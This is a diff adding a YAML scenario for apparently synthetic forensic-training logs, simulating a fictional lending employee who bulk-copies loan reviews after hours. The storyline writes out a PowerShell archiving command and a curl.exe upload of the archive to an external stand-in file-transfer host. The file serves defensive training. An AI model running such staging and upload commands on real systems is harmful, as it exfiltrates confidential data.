@@ -1,0 +1,445 @@
+name: alderbrook-insider-exfiltration
+description: 'Investigate misuse of valid lending access: after-hours bulk collection, local archiving
+  and upload to a personal file-transfer workspace.'
+status: published
+
+publisher: evidenceforge
+parents:
+- kind: scenario
+  publisher: evidenceforge
+  name: alderbrook-insider-exfiltration
+  draft_id: 0e040eb1-7fa5-4acf-bc7c-7e102f4e6db5
+  digest: 2d95be2476cc982e261b11bb6688ba1cca34d259fdb8a92c04789ec8b3eb633d
+display_name: Alderbrook Lending - Insider Data Theft
+schema_version: '3.0'
+composition:
+  industries:
+  - source: path
+    publisher: evidenceforge
+    name: finance
+    version: 1.0.0
+    path: ../dependencies/evidenceforge/industry/finance/1.0.0
+environment:
+  description: Alderbrook Lending, a fictional eight-person commercial lending team using a shared review
+    repository.
+  domain: alderbrook.example
+  timezone:
+    default: America/New_York
+  users:
+  - username: jules.parker
+    full_name: Jules Parker
+    email: jules.parker@alderbrook.example
+    persona: evidenceforge/finance:finance_operations
+    primary_system: ABL-WS-01
+    groups:
+    - Lending
+  - username: tessa.morgan
+    full_name: Tessa Morgan
+    email: tessa.morgan@alderbrook.example
+    persona: evidenceforge/finance:finance_operations
+    primary_system: ABL-WS-02
+    groups:
+    - Lending
+  - username: victor.chen
+    full_name: Victor Chen
+    email: victor.chen@alderbrook.example
+    persona: evidenceforge/finance:finance_operations
+    primary_system: ABL-WS-03
+    groups:
+    - Lending
+  - username: amara.okafor
+    full_name: Amara Okafor
+    email: amara.okafor@alderbrook.example
+    persona: evidenceforge/finance:finance_operations
+    primary_system: ABL-WS-04
+    groups:
+    - Lending
+  - username: noah.ellis
+    full_name: Noah Ellis
+    email: noah.ellis@alderbrook.example
+    persona: analyst
+    primary_system: ABL-WS-05
+    groups:
+    - Lending
+  - username: sophie.laurent
+    full_name: Sophie Laurent
+    email: sophie.laurent@alderbrook.example
+    persona: analyst
+    primary_system: ABL-WS-06
+    groups:
+    - Lending
+  - username: grace.bell
+    full_name: Grace Bell
+    email: grace.bell@alderbrook.example
+    persona: executive
+    primary_system: ABL-WS-07
+    groups:
+    - Lending
+  - username: erin.walsh
+    full_name: Erin Walsh
+    email: erin.walsh@alderbrook.example
+    persona: sysadmin
+    primary_system: ABL-WS-08
+    groups:
+    - IT-Operations
+  systems:
+  - hostname: ABL-WS-01
+    ip: 10.72.10.21
+    os: Windows 11
+    roles:
+    - workstation
+    type: workstation
+    services: []
+    assigned_user: jules.parker
+  - hostname: ABL-WS-02
+    ip: 10.72.10.22
+    os: Windows 11
+    roles:
+    - workstation
+    type: workstation
+    services: []
+    assigned_user: tessa.morgan
+  - hostname: ABL-WS-03
+    ip: 10.72.10.23
+    os: Windows 11
+    roles:
+    - workstation
+    type: workstation
+    services: []
+    assigned_user: victor.chen
+  - hostname: ABL-WS-04
+    ip: 10.72.10.24
+    os: Windows 11
+    roles:
+    - workstation
+    type: workstation
+    services: []
+    assigned_user: amara.okafor
+  - hostname: ABL-WS-05
+    ip: 10.72.10.25
+    os: Windows 11
+    roles:
+    - workstation
+    type: workstation
+    services: []
+    assigned_user: noah.ellis
+  - hostname: ABL-WS-06
+    ip: 10.72.10.26
+    os: Windows 11
+    roles:
+    - workstation
+    type: workstation
+    services: []
+    assigned_user: sophie.laurent
+  - hostname: ABL-WS-07
+    ip: 10.72.10.27
+    os: Windows 11
+    roles:
+    - workstation
+    type: workstation
+    services: []
+    assigned_user: grace.bell
+  - hostname: ABL-WS-08
+    ip: 10.72.10.28
+    os: Windows 11
+    roles:
+    - workstation
+    type: workstation
+    services: []
+    assigned_user: erin.walsh
+  - hostname: ABL-DC-01
+    ip: 10.72.20.10
+    os: Windows Server 2022
+    roles:
+    - domain_controller
+    - dns_server
+    type: domain_controller
+    services:
+    - DNS
+    - Kerberos
+    - LDAP
+  - hostname: ABL-FILE-01
+    ip: 10.72.20.20
+    os: Windows Server 2022
+    roles:
+    - file_server
+    type: server
+    services:
+    - SMB
+  groups:
+  - name: Lending
+    members:
+    - jules.parker
+    - tessa.morgan
+    - victor.chen
+    - amara.okafor
+    - noah.ellis
+    - sophie.laurent
+    - grace.bell
+  - name: IT-Operations
+    members:
+    - erin.walsh
+  network:
+    segments:
+    - name: office
+      cidr: 10.72.10.0/24
+      exposure: internal
+    - name: servers
+      cidr: 10.72.20.0/24
+      exposure: internal
+    sensors:
+    - type: network
+      name: alderbrook-core-span
+      monitoring_segments:
+      - office
+      - servers
+      placement: span
+      log_formats:
+      - zeek
+    public_cidrs: []
+  network_identities:
+  - id: file-transfer-service
+    hosts:
+    - upload.workspace-sync.example
+    ips:
+    - 198.51.100.92
+    tags: []
+    dns: true
+  - id: approved-workspace
+    hosts:
+    - files.alderbrook-workspace.example
+    ips:
+    - 192.0.2.92
+    tags: []
+    dns: true
+  storage:
+    population: small
+    activity: normal
+    servers:
+    - system: ABL-FILE-01
+      presets: []
+      audit: high
+      default_volume: data
+      volumes:
+      - id: data
+        mount: D:\
+        filesystem: ntfs
+        label: LendingData
+      shares:
+      - id: loan_reviews
+        name: LoanReviews
+        volume: data
+        root: Departments\Lending
+        preset: evidenceforge/finance:finance-department
+        access:
+          read:
+          - Lending
+          modify:
+          - Lending
+          admin:
+          - IT-Operations
+        seed_files:
+        - ref: loan-review-1
+          path: Reviews\2026-Q4\Portfolio-01.xlsx
+          size_bytes: 188416
+          tags:
+          - loan-review
+          - quarterly
+        - ref: loan-review-2
+          path: Reviews\2026-Q4\Portfolio-02.xlsx
+          size_bytes: 196608
+          tags:
+          - loan-review
+          - quarterly
+        - ref: loan-review-3
+          path: Reviews\2026-Q4\Portfolio-03.xlsx
+          size_bytes: 204800
+          tags:
+          - loan-review
+          - quarterly
+        - ref: loan-review-4
+          path: Reviews\2026-Q4\Portfolio-04.xlsx
+          size_bytes: 212992
+          tags:
+          - loan-review
+          - quarterly
+        - ref: loan-review-5
+          path: Reviews\2026-Q4\Portfolio-05.xlsx
+          size_bytes: 221184
+          tags:
+          - loan-review
+          - quarterly
+        - ref: loan-review-6
+          path: Reviews\2026-Q4\Portfolio-06.xlsx
+          size_bytes: 229376
+          tags:
+          - loan-review
+          - quarterly
+        - ref: loan-review-7
+          path: Reviews\2026-Q4\Portfolio-07.xlsx
+          size_bytes: 237568
+          tags:
+          - loan-review
+          - quarterly
+        - ref: loan-review-8
+          path: Reviews\2026-Q4\Portfolio-08.xlsx
+          size_bytes: 245760
+          tags:
+          - loan-review
+          - quarterly
+    mappings:
+    - id: lending-drive
+      share: ABL-FILE-01.loan_reviews
+      audience:
+        groups:
+        - Lending
+      drive: 'L:'
+      credential_mode: per_user
+      lifecycle: persistent
+time_window:
+  start: '2026-11-09T14:00:00Z'
+  duration: 24h
+  warmup: 1h
+baseline_activity:
+  description: Normal business activity mixed with routine administration.
+  intensity: medium
+  variation: high
+  suspicious_noise: low
+output:
+  logs:
+  - format: windows
+  - format: zeek
+  - format: ecar
+  destination: ./output
+  compression: false
+release_notes: Initial bundled training example.
+generation_seed: 7201
+observation_profile: complete
+storyline:
+- id: ordinary-review
+  time: +2h
+  actor: jules.parker
+  system: ABL-WS-01
+  activity: The employee performs an ordinary single-document review during business hours.
+  events:
+  - type: smb_activity
+    operation: read
+    purpose: interactive
+    target:
+      type: share
+      share: ABL-FILE-01.loan_reviews
+      file_ref: loan-review-1
+    mapping: lending-drive
+    path_style: mapped
+- id: late-return
+  time: +11h5m
+  actor: jules.parker
+  system: ABL-WS-01
+  activity: The employee returns to the workstation well after the normal workday.
+  events:
+  - type: logon
+    logon_type: 2
+- id: review-enumeration
+  time: +11h10m
+  actor: jules.parker
+  system: ABL-WS-01
+  activity: The employee enumerates the complete quarterly review directory.
+  events:
+  - type: smb_activity
+    operation: browse
+    purpose: collection
+    target:
+      type: share
+      share: ABL-FILE-01.loan_reviews
+    mapping: lending-drive
+    path_style: mapped
+- id: bulk-local-collection
+  time: +11h14m
+  actor: jules.parker
+  system: ABL-WS-01
+  activity: Quarterly loan reviews are copied into a local temporary directory using the employee's normal
+    permissions.
+  events:
+  - type: smb_activity
+    operation: copy
+    purpose: collection
+    source:
+      type: share
+      share: ABL-FILE-01.loan_reviews
+      selector:
+        tags_any:
+        - loan-review
+    destination:
+      type: client
+      directory: C:\Users\jules.parker\AppData\Local\Temp\Review
+    batch:
+      count: 8
+      duration: 65s
+    mapping: lending-drive
+    path_style: mapped
+- id: local-archive
+  time: +11h20m
+  actor: jules.parker
+  system: ABL-WS-01
+  activity: The collected review directory is compressed into one local archive.
+  events:
+  - type: process
+    process_name: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+    command_line: powershell.exe -NoProfile -Command "Compress-Archive -Path C:\Users\jules.parker\AppData\Local\Temp\Review\Reviews
+      -DestinationPath C:\Users\jules.parker\AppData\Local\Temp\Review\board-review.zip -Force"
+- id: personal-upload
+  time: +11h28m
+  actor: jules.parker
+  system: ABL-WS-01
+  activity: The archive is uploaded to a personal workspace at an external file-transfer service.
+  events:
+  - type: process
+    process_name: C:\Windows\System32\curl.exe
+    command_line: curl.exe -F "file=@C:\Users\jules.parker\AppData\Local\Temp\Review\board-review.zip;type=application/zip"
+      https://upload.workspace-sync.example/api/objects
+    process_ref: archive-uploader
+  - type: connection
+    dst_ip: 198.51.100.92
+    dst_port: 443
+    hostname: upload.workspace-sync.example
+    service: https
+    method: POST
+    uri: /api/objects
+    status_code: 201
+    user_agent: curl/8.13.0
+    request_multipart:
+      parts:
+      - name: file
+        local_source_path: C:\Users\jules.parker\AppData\Local\Temp\Review\board-review.zip
+        filename: board-review.zip
+        content_type: application/zip
+    response_body_len: 92
+    technique: T1567.002
+red_herrings:
+- id: approved-portfolio-export
+  time: +3h
+  actor: tessa.morgan
+  system: ABL-WS-02
+  activity: A colleague exports a small set of quarterly reviews during an approved business workflow.
+  events:
+  - type: smb_activity
+    operation: copy
+    purpose: interactive
+    source:
+      type: share
+      share: ABL-FILE-01.loan_reviews
+      selector:
+        tags_any:
+        - loan-review
+    destination:
+      type: client
+      directory: C:\Users\tessa.morgan\Documents\QuarterlyReview
+    batch:
+      count: 3
+      duration: 30s
+    mapping: lending-drive
+    path_style: mapped
+  explanation: Approved daytime review copies provide a comparison for account, timing, volume, staging
+    path and subsequent destination; bulk access alone is not proof of misuse.
+scenario_version: 1.0.0
+configuration_context: ../configuration/context.yaml
